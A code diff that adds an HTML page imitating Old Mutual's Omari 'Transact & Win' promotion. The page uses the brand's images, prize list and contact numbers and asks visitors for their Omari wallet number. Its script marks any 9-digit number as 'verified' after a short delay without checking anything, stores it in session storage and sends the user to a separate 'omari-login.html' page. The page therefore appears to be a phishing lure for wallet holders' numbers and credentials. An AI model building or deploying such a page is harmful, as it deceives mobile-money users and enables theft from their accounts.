@@ -1,0 +1,429 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="theme-color" content="#00A651">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="Omari Win">
+<title>Omari — Transact &amp; Win</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600;9..40,700;9..40,800&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{width:100%;height:100%;overflow:hidden;overscroll-behavior:none;position:fixed;inset:0}
+body{font-family:'DM Sans',system-ui,sans-serif;-webkit-font-smoothing:antialiased;background:#fff;color:#1a1a1a}
+button{font-family:inherit;cursor:pointer;touch-action:manipulation;border:none;background:none;outline:none}
+img{display:block;max-width:100%}
+input{font-family:inherit;border:none;outline:none;background:none;-webkit-user-select:text!important;user-select:text!important}
+*{-webkit-user-select:none;user-select:none}
+
+:root{
+  --grn:#00A651;--grn-dk:#007A3D;--grn-lt:#E8F5EE;--grn-a:rgba(0,166,81,.12);
+  --navy:#003366;--navy-lt:#E8EEF5;
+  --gold:#C8A951;--gold-lt:#FBF6E8;
+  --white:#fff;--bg:#F7F7F7;
+  --ink1:#1A1A1A;--ink2:#333;--ink3:#666;--ink4:#999;
+  --line:#E5E5E5;--line2:#EFEFEF;
+  --sh0:0 1px 3px rgba(0,0,0,.08);
+  --sh-grn:0 4px 20px rgba(0,166,81,.28);
+  --r8:8px;--r12:12px;--r16:16px;--rpill:999px;
+  --ease:cubic-bezier(.22,1,.36,1);
+}
+
+@keyframes pgIn{from{opacity:0}to{opacity:1}}
+@keyframes ripple{to{transform:scale(4);opacity:0}}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ── APP SHELL ── */
+#app{display:flex;flex-direction:column;width:100%;height:100dvh;overflow:hidden;animation:pgIn .2s ease both}
+
+/* ── HEADER ── */
+.site-header{
+  flex:0 0 auto;
+  padding:calc(env(safe-area-inset-top) + 12px) 16px 12px;
+  background:#fff;
+  border-bottom:1px solid var(--line);
+  display:flex;align-items:center;justify-content:space-between;
+  z-index:10;
+}
+.header-logo{height:40px;width:auto;object-fit:contain}
+.header-badge{background:var(--grn);color:#fff;font-size:10px;font-weight:700;padding:4px 12px;border-radius:var(--rpill);letter-spacing:.3px}
+
+/* ── SCROLL BODY ── */
+#body{flex:1;min-height:0;overflow-y:auto;overflow-x:hidden;scrollbar-width:none}
+#body::-webkit-scrollbar{display:none}
+
+/* ── HERO BANNER ── */
+.hero-banner{width:100%;position:relative;overflow:hidden;background:#003366}
+.hero-img{width:100%;height:220px;object-fit:cover;object-position:center top;display:block}
+.hero-overlay{position:absolute;inset:0;background:linear-gradient(to bottom,rgba(0,0,0,.05) 0%,rgba(0,0,0,.45) 100%)}
+.hero-text{position:absolute;bottom:16px;left:16px;right:16px}
+.hero-headline{font-size:22px;font-weight:800;color:#fff;letter-spacing:-.5px;line-height:1.15;text-shadow:0 2px 8px rgba(0,0,0,.3)}
+.hero-sub{font-size:12px;color:rgba(255,255,255,.85);font-weight:500;margin-top:4px;text-shadow:0 1px 4px rgba(0,0,0,.3)}
+
+/* ── SECTION ── */
+.section{padding:20px 16px;border-bottom:1px solid var(--line2)}
+.section:last-child{border-bottom:none}
+.section-label{font-size:10px;font-weight:700;color:var(--grn);letter-spacing:.8px;text-transform:uppercase;margin-bottom:6px}
+.section-title{font-size:18px;font-weight:800;color:var(--ink1);letter-spacing:-.3px;line-height:1.2;margin-bottom:10px}
+.section-body{font-size:13px;color:var(--ink2);line-height:1.6;font-weight:400}
+.section-body strong{color:var(--ink1);font-weight:700}
+
+/* ── SPLIT LAYOUT (image + text) ── */
+.split{display:flex;flex-direction:column;gap:14px}
+.split-img{width:100%;height:180px;object-fit:cover;border-radius:var(--r12);display:block}
+.split.reverse .split-img{order:-1}
+
+/* ── BULLET LIST ── */
+.bullet-list{display:flex;flex-direction:column;gap:7px;margin-top:10px}
+.bullet-item{display:flex;align-items:flex-start;gap:8px;font-size:13px;color:var(--ink2);line-height:1.5}
+.bullet-dot{width:7px;height:7px;border-radius:50%;background:var(--grn);flex-shrink:0;margin-top:5px}
+.bullet-item b{color:var(--ink1);font-weight:700}
+
+/* ── PRIZE CARDS ── */
+.prize-section{background:var(--grn-lt);border-radius:var(--r12);padding:14px;margin-top:12px}
+.prize-section-title{font-size:11px;font-weight:700;color:var(--grn-dk);letter-spacing:.4px;text-transform:uppercase;margin-bottom:10px}
+.prize-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.prize-card{background:#fff;border-radius:var(--r8);padding:12px 10px;text-align:center;box-shadow:var(--sh0);border:1px solid rgba(0,166,81,.12)}
+.prize-emoji{font-size:24px;margin-bottom:4px}
+.prize-name{font-size:11px;font-weight:600;color:var(--ink1);line-height:1.3}
+.prize-tier{font-size:9px;font-weight:700;color:var(--grn);text-transform:uppercase;letter-spacing:.4px;margin-top:2px}
+
+/* Grand prize card — full width */
+.prize-card.grand{grid-column:1/-1;display:flex;align-items:center;gap:12px;text-align:left;background:linear-gradient(135deg,#003366,#00A651);border:none;padding:14px}
+.prize-card.grand .prize-emoji{font-size:32px;margin-bottom:0;flex-shrink:0}
+.prize-card.grand .prize-name{font-size:13px;font-weight:800;color:#fff}
+.prize-card.grand .prize-tier{color:rgba(255,255,255,.7);font-size:10px}
+
+/* ── HOW IT WORKS STEPS ── */
+.steps{display:flex;flex-direction:column;gap:0;margin-top:10px}
+.step-row{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid var(--line2)}
+.step-row:last-child{border-bottom:none}
+.step-num{width:28px;height:28px;border-radius:50%;background:var(--grn);color:#fff;font-size:12px;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
+.step-text{font-size:13px;color:var(--ink2);line-height:1.5}
+.step-text strong{color:var(--ink1)}
+
+/* ── OUTLETS CHIPS ── */
+.outlets{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px}
+.outlet-chip{background:var(--navy-lt);border:1px solid rgba(0,51,102,.15);color:var(--navy);font-size:11px;font-weight:600;padding:5px 12px;border-radius:var(--rpill)}
+
+/* ── CONTACT LIST ── */
+.contact-list{display:flex;flex-direction:column;gap:8px;margin-top:10px}
+.contact-item{display:flex;align-items:center;gap:10px;font-size:12px;color:var(--ink2);font-weight:500}
+.contact-ic{width:32px;height:32px;border-radius:50%;background:var(--grn-lt);border:1px solid rgba(0,166,81,.2);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.contact-val{font-weight:600;color:var(--ink1)}
+
+/* ── NUMBER INPUT ── */
+.enter-section{background:#fff;padding:20px 16px;border-top:2px solid var(--grn)}
+.enter-title{font-size:16px;font-weight:800;color:var(--ink1);letter-spacing:-.3px;margin-bottom:4px}
+.enter-sub{font-size:12px;color:var(--ink3);margin-bottom:14px;font-weight:400}
+.num-field{display:flex;align-items:center;background:var(--bg);border:1.5px solid var(--line);border-radius:var(--r12);overflow:hidden;transition:border-color .18s,box-shadow .18s;min-height:52px}
+.num-field.foc{border-color:var(--grn);box-shadow:0 0 0 3px var(--grn-a)}
+.num-field.ok{border-color:var(--grn);box-shadow:0 0 0 3px var(--grn-a)}
+.num-field.err{border-color:#C8192B;box-shadow:0 0 0 3px rgba(200,25,43,.10)}
+.num-pre{display:flex;align-items:center;gap:6px;padding:0 12px 0 14px;border-right:1.5px solid var(--line);height:52px;flex-shrink:0;background:#fff}
+.num-flag{font-size:18px;line-height:1}
+.num-code{font-size:14px;font-weight:700;color:var(--ink2)}
+#numInput{flex:1;min-width:0;font-size:20px;font-weight:700;color:var(--ink1);padding:0 14px;height:52px;letter-spacing:.04em;caret-color:var(--grn)}
+#numInput::placeholder{color:var(--ink4);font-size:13px;font-weight:400;letter-spacing:0}
+.num-hint{font-size:11px;color:var(--ink3);margin-top:6px;min-height:16px}
+.num-hint.ok{color:var(--grn);font-weight:600}
+.num-hint.err{color:#C8192B;font-weight:600}
+
+/* ── PAY BAR ── */
+#payBar{flex:0 0 auto;display:none;padding:10px 16px max(16px,env(safe-area-inset-bottom));background:#fff;border-top:1px solid var(--line);box-shadow:0 -2px 12px rgba(0,0,0,.08)}
+#payBar.show{display:block}
+.enter-btn{width:100%;min-height:52px;border-radius:var(--rpill);background:var(--grn);color:#fff;font-size:15px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:var(--sh-grn);transition:transform .12s,background .12s;position:relative;overflow:hidden}
+.enter-btn:active{transform:scale(.97);background:var(--grn-dk)}
+.enter-btn:disabled{opacity:.45;box-shadow:none;background:#ccc;transform:none}
+.rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(255,255,255,.22);transform:scale(0);animation:ripple .5s ease forwards}
+</style>
+</head>
+<body>
+<div id="app">
+
+  <!-- HEADER -->
+  <div class="site-header">
+    <img class="header-logo"
+      src="https://eu-images.contentstack.com/v3/assets/blt0554f48052bb4620/blt684cdefbcad8ec0e/68d270a6f377720c7bdcdcda/banner-old-mutual.png"
+      alt="Old Mutual"
+      onerror="this.outerHTML='<span style=\'font-size:18px;font-weight:800;color:#003366\'>Old Mutual</span>'">
+    <span class="header-badge">Transact &amp; Win</span>
+  </div>
+
+  <!-- BODY -->
+  <div id="body">
+
+    <!-- HERO BANNER -->
+    <div class="hero-banner">
+      <img class="hero-img"
+        src="https://eu-images.contentstack.com/v3/assets/bltdd392fd32dda3ce8/blt88bc7157d720f99d/6a42252aa6d47541c00591af/Transact_and_Win_1312x540.webp"
+        alt="Omari Transact and Win"
+        onerror="this.style.display='none'">
+      <div class="hero-overlay"></div>
+      <div class="hero-text">
+        <div class="hero-headline">Transact &amp; Win<br>KaSoft Life! 🏆</div>
+        <div class="hero-sub">1 June – 30 September 2026</div>
+      </div>
+    </div>
+
+    <!-- SECTION 1: Promotion Period -->
+    <div class="section">
+      <div class="split">
+        <div>
+          <div class="section-label">Promotion</div>
+          <div class="section-title">Promotion Period</div>
+          <div class="section-body">
+            The promotion is valid from <strong>1 June – 30 September 2026.</strong><br><br>
+            This is four months of cashing in, transacting, winning exciting rewards, and living <strong>KaSoft Life!</strong>
+          </div>
+          <div class="section-body" style="margin-top:12px"><strong>Who Can Enter?</strong><br>Here are the eligibility details below:</div>
+          <div class="bullet-list">
+            <div class="bullet-item"><div class="bullet-dot"></div>Open to all <b>Zimbabwean residents</b> aged 18 and above</div>
+            <div class="bullet-item"><div class="bullet-dot"></div>You must be registered on the <b>Omari wallet</b> and hold a valid national ID, passport, or driver's license</div>
+            <div class="bullet-item"><div class="bullet-dot"></div>Your wallet must be active</div>
+          </div>
+        </div>
+        <img class="split-img"
+          src="https://eu-images.contentstack.com/v3/assets/bltdd392fd32dda3ce8/blt872c5733159b392f/6a42252ae749ef0740a0192b/Transact_and_Win_3.webp"
+          alt="Promotion Period"
+          onerror="this.style.display='none'">
+      </div>
+    </div>
+
+    <!-- SECTION 2: How to Enter -->
+    <div class="section" style="background:#F7F7F7">
+      <div class="split reverse">
+        <img class="split-img"
+          src="https://eu-images.contentstack.com/v3/assets/bltdd392fd32dda3ce8/blt391b6fe08a49304e/6a42252972bc69b81bd43e1f/Transact_and_Win_1.webp"
+          alt="How to Enter"
+          onerror="this.style.display='none'">
+        <div>
+          <div class="section-label">Entries</div>
+          <div class="section-title">Here is how to enter</div>
+          <div class="section-body">Simply cash in or use at least <strong>US$200</strong> (or ZWG equivalent) using your Omari Wallet through:</div>
+          <div class="bullet-list">
+            <div class="bullet-item"><div class="bullet-dot"></div>Cashing in at our various outlets or agents</div>
+            <div class="bullet-item"><div class="bullet-dot"></div>ZIPIT - Receive (USD &amp; ZWG)</div>
+            <div class="bullet-item"><div class="bullet-dot"></div>Receive money from abroad</div>
+            <div class="bullet-item"><div class="bullet-dot"></div>Omari Visa Card Payments (Swipe, Tap &amp; Online)</div>
+            <div class="bullet-item"><div class="bullet-dot"></div>ZimSwitch Card Payments (Swipe, Tap &amp; Online)</div>
+          </div>
+          <div class="section-body" style="margin-top:12px;padding:10px 12px;background:var(--grn-lt);border-radius:var(--r8);border-left:3px solid var(--grn)">
+            The more you spend, the more entries you earn into <strong>daily, weekly, monthly,</strong> and <strong>grand prize</strong> draws.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECTION 3: What can you win -->
+    <div class="section">
+      <div class="split">
+        <div>
+          <div class="section-label">Prizes</div>
+          <div class="section-title">What can you win?</div>
+
+          <!-- Grand Prize -->
+          <div class="prize-section" style="background:linear-gradient(135deg,#003366,#00A651);margin-top:0;margin-bottom:10px;padding:14px">
+            <div class="prize-section-title" style="color:rgba(255,255,255,.7)">Grand Prize</div>
+            <div style="display:flex;gap:12px;align-items:center">
+              <span style="font-size:36px">🏠</span>
+              <div>
+                <div style="font-size:15px;font-weight:800;color:#fff">Residential Stand</div>
+                <div style="font-size:11px;color:rgba(255,255,255,.7);margin-top:2px">+ US$10,000 Cash · Trip to China · Trip to South Africa</div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Monthly prizes -->
+          <div class="prize-section" style="margin-bottom:10px">
+            <div class="prize-section-title">Monthly Draws</div>
+            <div class="prize-grid">
+              <div class="prize-card"><div class="prize-emoji">⛽</div><div class="prize-name">20L Fuel / Month</div><div class="prize-tier">For a Year</div></div>
+              <div class="prize-card"><div class="prize-emoji">🛒</div><div class="prize-name">US$100 Grocery Voucher</div><div class="prize-tier">Monthly for a Year</div></div>
+              <div class="prize-card"><div class="prize-emoji">🍞</div><div class="prize-name">A Loaf of Bread Daily</div><div class="prize-tier">For a Year</div></div>
+              <div class="prize-card"><div class="prize-emoji">🥤</div><div class="prize-name">A Crate of Drinks</div><div class="prize-tier">Monthly for a Year</div></div>
+              <div class="prize-card" style="grid-column:1/-1"><div class="prize-emoji">💊</div><div class="prize-name">US$50 Pharmacy Voucher Monthly</div><div class="prize-tier">For a Year</div></div>
+            </div>
+          </div>
+
+          <!-- Daily/Weekly prizes -->
+          <div class="prize-section" style="background:var(--navy-lt)">
+            <div class="prize-section-title" style="color:var(--navy)">Daily &amp; Weekly Draws</div>
+            <div class="prize-grid">
+              <div class="prize-card"><div class="prize-emoji">📱</div><div class="prize-name">Airtime</div><div class="prize-tier" style="color:var(--navy)">Daily Spin</div></div>
+              <div class="prize-card"><div class="prize-emoji">🍽️</div><div class="prize-name">Meal Vouchers</div><div class="prize-tier" style="color:var(--navy)">Daily Spin</div></div>
+              <div class="prize-card"><div class="prize-emoji">💵</div><div class="prize-name">Cash Prizes</div><div class="prize-tier" style="color:var(--navy)">Weekly</div></div>
+              <div class="prize-card"><div class="prize-emoji">⛽</div><div class="prize-name">Fuel Vouchers</div><div class="prize-tier" style="color:var(--navy)">Weekly</div></div>
+            </div>
+          </div>
+        </div>
+        <img class="split-img"
+          src="https://eu-images.contentstack.com/v3/assets/bltdd392fd32dda3ce8/blt57a9e17034c72417/6a422a51e369588ca70401bc/Transact_and_Win_4.webp"
+          alt="Prizes"
+          onerror="this.style.display='none'">
+      </div>
+    </div>
+
+    <!-- SECTION 4: Get a Card -->
+    <div class="section" style="background:#F7F7F7">
+      <div class="split reverse">
+        <img class="split-img"
+          src="https://eu-images.contentstack.com/v3/assets/bltdd392fd32dda3ce8/blt49387ab034a68ad7/6a42252aa6d47515270591b3/Transact_and_Win_2.webp"
+          alt="Get your card"
+          onerror="this.style.display='none'">
+        <div>
+          <div class="section-label">Get Started</div>
+          <div class="section-title">Don't have an Omari card yet?</div>
+          <div class="section-body">Get your Visa or ZimSwitch card at:</div>
+          <div class="outlets">
+            <span class="outlet-chip">Omari Remittance Centres</span>
+            <span class="outlet-chip">OK Zimbabwe</span>
+            <span class="outlet-chip">SPAR</span>
+            <span class="outlet-chip">TM Pick n Pay</span>
+            <span class="outlet-chip">CABS</span>
+            <span class="outlet-chip">Chicken Slice</span>
+            <span class="outlet-chip">MedOrange</span>
+          </div>
+          <div class="section-body" style="margin-top:12px;font-size:11px;color:var(--ink4)">And other participating locations nationwide.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECTION 5: Need Help -->
+    <div class="section">
+      <div class="split">
+        <div>
+          <div class="section-label">Support</div>
+          <div class="section-title">Need Help?</div>
+          <div class="section-body">Get in touch with us:</div>
+          <div class="contact-list">
+            <div class="contact-item">
+              <div class="contact-ic"><svg width="14" height="14" viewBox="0 0 24 24" fill="var(--grn)"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M11.5 2.75C6.675 2.75 2.75 6.675 2.75 11.5c0 1.563.415 3.03 1.14 4.3L2.75 21.25l5.588-1.114A8.72 8.72 0 0011.5 20.25c4.825 0 8.75-3.925 8.75-8.75S16.325 2.75 11.5 2.75z" fill="none" stroke="var(--grn)" stroke-width="1.5"/></svg></div>
+              <div><div style="font-size:11px;color:var(--ink3)">WhatsApp</div><div class="contact-val">+263 780 040 219 / +263 719 433 433</div></div>
+            </div>
+            <div class="contact-item">
+              <div class="contact-ic"><svg width="14" height="14" viewBox="0 0 24 24" fill="var(--grn)"><path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.6.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1-9.4 0-17-7.6-17-17 0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.3.2 2.5.6 3.6.1.3 0 .7-.2 1L6.6 10.8z"/></svg></div>
+              <div><div style="font-size:11px;color:var(--ink3)">Toll-Free</div><div class="contact-val">433 / 466</div></div>
+            </div>
+            <div class="contact-item">
+              <div class="contact-ic"><svg width="14" height="14" viewBox="0 0 24 24" fill="var(--grn)"><path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.6.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1-9.4 0-17-7.6-17-17 0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.3.2 2.5.6 3.6.1.3 0 .7-.2 1L6.6 10.8z"/></svg></div>
+              <div><div style="font-size:11px;color:var(--ink3)">General Line</div><div class="contact-val">+263 8677 007437</div></div>
+            </div>
+            <div class="contact-item">
+              <div class="contact-ic"><svg width="14" height="14" viewBox="0 0 24 24" fill="var(--grn)"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 2l-8 5-8-5h16zm0 12H4V8l8 5 8-5v10z"/></svg></div>
+              <div><div style="font-size:11px;color:var(--ink3)">Email</div><div class="contact-val">contactus@oldmutual.co.zw</div></div>
+            </div>
+            <div class="contact-item">
+              <div class="contact-ic"><svg width="14" height="14" viewBox="0 0 24 24" fill="var(--grn)"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg></div>
+              <div><div style="font-size:11px;color:var(--ink3)">Visa Support WhatsApp</div><div class="contact-val">+263 787 707 707</div></div>
+            </div>
+          </div>
+        </div>
+        <img class="split-img"
+          src="https://eu-images.contentstack.com/v3/assets/bltdd392fd32dda3ce8/blt43bafc73d3036d3d/6785198d0c030d1664b2a7ce/Get_Help_5.jpg"
+          alt="Need Help"
+          onerror="this.style.display='none'">
+      </div>
+    </div>
+
+    <!-- ENTER SECTION -->
+    <div class="enter-section">
+      <div class="enter-title">Check Your Entries</div>
+      <div class="enter-sub">Enter your O'mari number to verify your entries and confirm participation</div>
+      <div class="num-field" id="numField">
+        <div class="num-pre">
+          <img src="https://eu-images.contentstack.com/v3/assets/bltdd392fd32dda3ce8/blt652fa4bd468b6c6a/65eedf0ce5630f040aca2115/flag-zimbabwe.svg" width="20" height="20" alt="ZW" onerror="this.outerHTML='🇿🇼'">
+          <span class="num-code">+263</span>
+        </div>
+        <input id="numInput" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="774 707 707" maxlength="9" autocomplete="tel-national">
+      </div>
+      <div class="num-hint" id="numHint">Dial *707# or WhatsApp 0774 707 707 to register</div>
+    </div>
+
+    <div style="height:80px;flex-shrink:0"></div>
+  </div><!-- /body -->
+
+  <!-- PAY BAR -->
+  <div id="payBar">
+    <button class="enter-btn" id="enterBtn" disabled onclick="goToLogin()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+      <span id="btnLbl">Enter your number</span>
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6z"/></svg>
+    </button>
+  </div>
+
+</div>
+
+<script>
+'use strict';
+function hap(t){try{if(navigator.vibrate)navigator.vibrate(t);}catch(e){}}
+
+var numOK=false, verTO=null;
+var numInput=document.getElementById('numInput');
+var numField=document.getElementById('numField');
+var numHint=document.getElementById('numHint');
+var payBar=document.getElementById('payBar');
+var enterBtn=document.getElementById('enterBtn');
+var btnLbl=document.getElementById('btnLbl');
+
+numInput.addEventListener('input',function(){
+  var v=this.value.replace(/\D/g,'').slice(0,9);
+  this.value=v;
+  clearTimeout(verTO);
+  numOK=false;enterBtn.disabled=true;
+
+  if(!v.length){
+    numField.className='num-field';
+    numHint.className='num-hint';
+    numHint.textContent="Dial *707# or WhatsApp 0774 707 707 to register";
+    payBar.classList.remove('show');
+    return;
+  }
+  numField.className='num-field foc';
+  payBar.classList.add('show');
+  btnLbl.textContent='Enter your number';
+
+  if(v.length===9){
+    numHint.className='num-hint';
+    numHint.textContent='Verifying…';
+    verTO=setTimeout(function(){
+      numOK=true;
+      numField.className='num-field ok';
+      numHint.className='num-hint ok';
+      numHint.textContent='✓ O\'mari number verified';
+      enterBtn.disabled=false;
+      btnLbl.textContent='Confirm Entry';
+      hap([8,30,8]);
+      var display='+263 '+v.slice(0,2)+'\u2022\u2022\u2022\u2022\u2022'+v.slice(-2);
+      sessionStorage.setItem('omariRecipient',JSON.stringify({raw:v,display:display}));
+    },800);
+  } else {
+    numHint.className='num-hint';
+    numHint.textContent='Enter your 9-digit O\'mari number';
+  }
+});
+
+function goToLogin(){
+  if(!numOK)return;
+  hap(18);
+  window.location.href='omari-login.html';
+}
+
+numInput.addEventListener('focus',function(){numField.classList.add('foc');});
+numInput.addEventListener('blur',function(){if(!numOK&&!numInput.value)numField.classList.remove('foc');});
+
+document.querySelectorAll('.enter-btn').forEach(function(b){
+  b.addEventListener('pointerdown',function(e){
+    var r=b.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2;
+    var rip=document.createElement('span');rip.className='rip';
+    rip.style.cssText='width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px;position:absolute;';
+    b.appendChild(rip);rip.addEventListener('animationend',function(){rip.remove();});
+  },{passive:true});
+});
+</script>
+</body>
+</html>
